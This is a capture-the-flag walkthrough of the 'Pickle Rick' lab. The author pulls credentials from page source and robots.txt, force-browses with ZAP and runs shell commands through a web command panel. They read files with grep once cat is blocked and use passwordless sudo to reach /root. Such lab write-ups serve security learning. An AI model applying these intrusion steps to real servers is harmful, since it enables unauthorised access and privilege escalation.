##Pickle Rick
#A Rick and Morty CTF. Help turn Rick back into a human!

This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

#Deploy the virtual machine on this task and explore the web application.
--> We know that it is a web-application

<Machine IP>
(Will be different for you)

Vist the webiste normally:
http://<Machine IP>

There is this comment:
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
Well, snippity snappity, this username is now our property

Then, I put this link into scope for ZAP.
I started Spider & Ajax Spider
Saw that robots.txt as well as sitemap.xml exist

robots.txt:
    Wubbalubbadubdub

But apparently, sitemap.xml gave 404

Force Browse Time using ZAP:
(Ticked the option force browse Files with the extensions: php, py, js, txt)
''''''
  http://<Machine-IP>:80/icons/
  http://<Machine-IP>:80/assets/
  http://<Machine-IP>:80/
  http://<Machine-IP>:80/assets/jquery.min.js
  http://<Machine-IP>:80/assets/bootstrap.min.css
  http://<Machine-IP>:80/assets/bootstrap.min.js
  http://<Machine-IP>:80/assets/bootstrap.min.js
  http://<Machine-IP>:80/assets - 301
  http://<Machine-IP>:80/login.php - 200
  http://<Machine-IP>:80/portal.php -302
''''''

'/portal.php' redirects to '/login.php'
We have a login page which asks for username & password
We have found some username: R1ckRul3s
And another random string: Wubbalubbadubdub

Apparently it this string is a password. Wubbalubbadubdub

After login, we have a page called the Command Panel
commands like ls work, but commands like cat, nano don't

In the source, we also found a base64 encoded string:
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==

After performing base64 decode, we get another bae64 string. Then, upon decoding, we get another and so on.
Finally, we get the text: "rabbit hole"
Ah sadge. Back to Command Panel it seems.

-------------------------------------------------------------------------
ls
'''''''
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
'''''''

-- We seem to need the secret ingredients. We need to cat out this super secret ingredient, to bring back Rick

cat
'''''''
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
'''''''

-- Cat doesn't work

whoami
'''''''
www-data
'''''''

--> Time to do, what it is called a pro hacker move. Search online how to output if cat doesn't work
I searched for "display without using cat"
https://bencane.com/2013/08/19/grepping-a-file-without-using-cat-and-grep-other-tricks/ says we can do 
      grep <pattern> file_name
to get the same output as 
      cat file_name | grep <pattern>

So, if the pattern is . then everything will be present
Let's try to use grep
-->

grep . Sup3rS3cretPickl3Ingred.txt
'''''''
<-da-flag-was-here->
'''''''
-- Probably the first flag
-- Look what we have here. Something that might be important
-- I don't know what to do, so let's look at clue.txt

grep . clue.txt
'''''''
Look around the file system for the other ingredient.
'''''''

-- So, we have to just look around everywhere

ls -la
'''''''
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
'''''''

ls /home
'''''''
rick
ubuntu
'''''''

ls /home/rick
'''''''
second ingredients
'''''''

ls -la /home/rick
'''''''
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
'''''''

-- So, 'second ingredients' is a file as well.
-- Time to display it out

grep . '/home/rick/second ingredients'
'''''''
<-da-flag-was-here->
'''''''
-- The second flag/ ingredient
-- The quotes were added since the file name has a space in between


ls -la /home/ubuntu
'''''''
total 40
drwxr-xr-x 4 ubuntu ubuntu 4096 Feb 10  2019 .
drwxr-xr-x 4 root   root   4096 Feb 10  2019 ..
-rw------- 1 ubuntu ubuntu  320 Feb 10  2019 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31  2015 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .cache
-rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Feb 10  2019 .sudo_as_admin_successful
-rw------- 1 ubuntu ubuntu 4267 Feb 10  2019 .viminfo
'''''''

ls /
'''''''
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
'''''''

-- Are we allowed to peak into root?
-- 'ls /root' doesn't work

-- Uhmm, Well
-- I was checking if I can become root somehow, https://www.golinuxcloud.com/linux-check-sudo-access/

sudo --list
'''''''
Matching Defaults entries for www-data on ip-10-10-191-221.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-191-221.eu-west-1.compute.internal:
    (ALL) NOPASSWD: AL
'''''''

-- This basically means, we can use sudo command, without needing a password
-- So, if we add a sudo ahead of the command 'ls /root', it might as well work

sudo ls /root
'''''''
3rd.txt
snap
'''''''

grep . /root/3rd.txt
-- Didn't work. Forgot sudo

sudo grep . /root/3rd.txt
'''''''
3rd ingredients: <-da-flag-was-here->
'''''''